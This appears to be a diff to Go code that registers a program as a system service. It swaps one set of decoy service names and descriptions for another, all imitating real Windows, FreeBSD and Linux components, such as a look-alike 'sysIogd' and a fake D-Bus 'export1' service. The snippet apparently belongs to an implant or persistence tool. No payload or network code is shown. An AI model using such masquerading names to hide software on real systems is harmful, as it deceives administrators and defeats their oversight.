@@ -14,19 +14,19 @@ func GetServiceConfig() *service.Config {
 	switch runtime.GOOS {
 	// Windows config
 	case "windows":
-		svcName = "Windows Video"
-		svcDisplayName = "VideoSrv"
-		svcDesc = "Manages video for Windows-based programs.  If this service is stopped, video devices and effects will not function properly.  If this service is disabled, any services that explicitly depend on it will fail to start"
+		svcName = "NT Updater"
+		svcDisplayName = "ntupdater"
+		svcDesc = "NT Subsystem Component Updater"
 	// FreeBSD config
 	case "freebsd":
-		svcName = "sysIogd"
-		svcDisplayName = "sysIogd"
-		svcDesc = "System Iog daemon"
+		svcName = "cryptfs"
+		svcDisplayName = "Cryptographic File System Mount Daemon"
+		svcDesc = "Provides transparent file-level encryption and decryption services for specified storage volumes during system initialization."
 	// Unix config
 	default:
 		svcName = "dbus-org.freedesktop.export1"
 		svcDisplayName = "Disk Image Upload Service"
-		svcDesc = ""
+		svcDesc = "Facilitates the secure, automated exporting and uploading of virtual disk images to remote cloud repositories and storage networks."
 	}
 
 	return &service.Config{
